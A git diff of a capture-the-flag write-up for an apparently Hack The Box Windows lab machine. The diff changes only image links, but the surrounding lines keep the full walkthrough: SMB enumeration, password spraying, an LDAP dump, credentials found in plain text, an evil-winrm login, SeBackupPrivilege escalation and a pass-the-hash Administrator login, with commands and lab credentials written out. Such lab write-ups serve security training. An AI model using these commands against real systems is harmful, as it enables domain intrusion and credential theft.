@@ -107,7 +107,7 @@
 <span class="hljs-number">1</span>   <span class="hljs-number">32.09</span> <span class="hljs-string">ms</span> <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.1</span>
 <span class="hljs-number">2</span>   <span class="hljs-number">64.41</span> <span class="hljs-string">ms</span> <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.149</span></code></pre></div>
 <p>Starting with SMB, we can find two nonstandard discs, DEV and HR.</p>
-<p><img src="/_resources/32c180c8f58547689edae18df9081651.png" /></p>
+<p><img src=":/32c180c8f58547689edae18df9081651" alt="81c7285407cf843bd8abfce8a8744098.png" /></p>
 <p>We cannot log into DEV disc with anonymus, but we can into HR. In there we can find a greeting message from HR with some interesting content.</p>
 <div><pre class="hljs"><code>Dear <span class="hljs-built_in">new</span> hire!
 
@@ -194,9 +194,9 @@ michael<span class="hljs-selector-class">.wrightson</span>
 david<span class="hljs-selector-class">.orelious</span>
 emily.oscars</code></pre></div>
 <p>and then run <code>crackmapexec smb 10.129.126.15 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'</code>.</p>
-<p><img src="/_resources/df92ba82ffcd47c2b71c753a3cf405da.png" /></p>
+<p><img src=":/df92ba82ffcd47c2b71c753a3cf405da" alt="f467a5d4cf9eb5b13886e6cabe3ad656.png" /></p>
 <p>Time to get in as <code>michael.wrightson</code>. Logging in to <code>/DEV</code> with smb didnt allow us to do anything either. Using this user we can dump all of the ldap with <code>ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.126.15 -o dump</code>. Looking for passwords within the dump with <code>cat ./* | grep password</code>, we can find "Just in case I forget my password is <code>aRt$Lp#7t*VQ!3</code>" in the description of user <code>david.orelious</code>. We finally get <code>/DEV</code>.</p>
-<p><img src="/_resources/09cb48a9da144ce48e5f05dc48a49f9a.png" /></p>
+<p><img src=":/09cb48a9da144ce48e5f05dc48a49f9a" alt="a2e47ea7c62aa0e27cf2ccd683f37be3.png" /></p>
 <p>Contents of Backup_script.ps1:</p>
 <div><pre class="hljs"><code><span class="hljs-variable">$sourceDirectory</span> = <span class="hljs-string">"C:\smb"</span>
 <span class="hljs-variable">$destinationDirectory</span> = <span class="hljs-string">"D:\Backup"</span>
@@ -211,7 +211,7 @@ emily.oscars</code></pre></div>
 <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">"Backup completed successfully. Backup file saved to: <span class="hljs-variable">$backupFilePath</span>"</span></code></pre></div>
 <p>Another user and password, <code>emily.oscars</code> : <code>Q!3@Lp#M6b*7t*Vt</code>. This one finally can log in via WinRM, so we are in.</p>
 <p><code>evil-winrm -i 10.129.126.15 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code></p>
-<p><img src="/_resources/4f53abc52c354afeb85efab41cfd086c.png" /></p>
+<p><img src=":/4f53abc52c354afeb85efab41cfd086c" alt="47e7e896354a455bf5ad4066bc3c79fa.png" /></p>
 <h1 id="priv-esc">Priv esc</h1>
 <p>We can learn that user Emily has quite a few privs. We can abuse SeBackupPriv for escalation for sure.</p>
 <div><pre class="hljs"><code><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\emily.oscars.CICADA\Desktop&gt; whoami /priv
@@ -246,7 +246,7 @@ DefaultAccount:<span class="hljs-number">503</span>:aad<span class="hljs-number"
 [*] Cleaning up... </code></pre></div>
 <p>By passing the hash, we are in!<br />
 <code>evil-winrm -i 10.129.126.15  -u "Administrator" -H  2b87e7c93a3e8a0ea4a581937016f341</code></p>
-<p><img src="/_resources/d9d959eb415a42b7bba6c7811a79272a.png" /></p>
+<p><img src=":/d9d959eb415a42b7bba6c7811a79272a" alt="51ee8c17843c0c0184d43ca8b73edfb0.png" /></p>
 </div>
       </article>
     </div>
